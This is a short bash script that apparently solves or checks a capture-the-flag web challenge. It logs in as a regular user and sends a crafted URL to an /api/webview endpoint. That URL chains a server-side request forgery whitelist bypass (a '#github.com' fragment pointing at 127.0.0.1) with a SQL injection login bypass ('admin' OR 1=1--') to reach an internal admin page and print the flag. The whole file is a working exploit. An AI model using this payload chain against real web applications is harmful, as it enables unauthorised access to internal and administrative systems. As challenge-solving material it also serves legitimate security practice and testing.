#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-http://185.221.196.71:31337}"
COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

echo "[*] Waiting for ${TARGET}"
for _ in $(seq 1 30); do
  if curl -s "${TARGET}/" >/dev/null 2>&1; then
    break
  fi
  sleep 1
done

echo "[*] Login as regular user"
curl -s -L \
  -c "$COOKIE_JAR" \
  -X POST "${TARGET}/login" \
  -d "login=player&password=player123" \
  >/dev/null

echo "[*] SSRF whitelist bypass -> internal /admin with SQLi"
BYPASS_URL="http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#github.com"

response="$(curl -s \
  -b "$COOKIE_JAR" \
  -X POST "${TARGET}/api/webview" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"${BYPASS_URL}\"}")"

echo "$response"

if [[ "$response" != *"practice{"* ]]; then
  exit 1
fi
